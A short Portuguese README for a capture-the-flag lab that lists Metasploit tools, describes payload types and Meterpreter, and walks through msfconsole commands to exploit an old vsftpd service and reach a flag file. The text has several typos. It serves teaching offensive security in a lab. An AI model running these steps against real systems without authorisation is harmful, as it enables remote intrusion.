# Acesso_Remoto_A_Metasploit

Acessando remotamente uma máquina Metasploit (capture the flag)

## Ferramentas do Metasploit

`msfconsole`; Console de modo.

`msfweb`; Interface gráfica via navegador.

`msfpayload`; Gerar e personalizar cargas úteis.

`msfcli`; Interface de automatização de invasão.

`msflogdump`; Exibirá as sessões de arquivos abertos.

### Payloads

**Módulos para explorar, sendo de três tipos.**

`Single`: Apenas um pacote enviado sem conexão com o atacante.

`Stoges`: Insira o módulo de ação.

#### Meterpreter

Ou meta-interpreter, é um payload que funciona por injeção de dll.
O MeterPreter reside na memória do hospedeiro e não deixa vestígios no disco rígido.

##### Acessando a máquina MSF

> Desafio: Encontrar o arquivo Flag.txt apartir de outra máquina.

Na Máquina Kali acessamos o Metasplo.

`msfconsole`;

Procuraremos pelo Tpd de nossa máquinha alvo, uma versão antiga e vulnerável, porém ainda muito utilizada.

`search vsTpd`;

Configurando o IP de destino.

`show options`;

`set RHOST + IP da máquina alvo`;

Para verificar o endereço de IP

`ip addr`;

Configurando os Payloads.

`show payloads`;

`set payload payload/cmd/unix/interact`;

Iniciando a aplicação.

`exploit`;

![Metasploit](https://github.com/IsaelCampos/Acesso_Remoto_A_Metasploit/assets/149100120/097c2198-856b-4635-9d50-03debf9b0534)

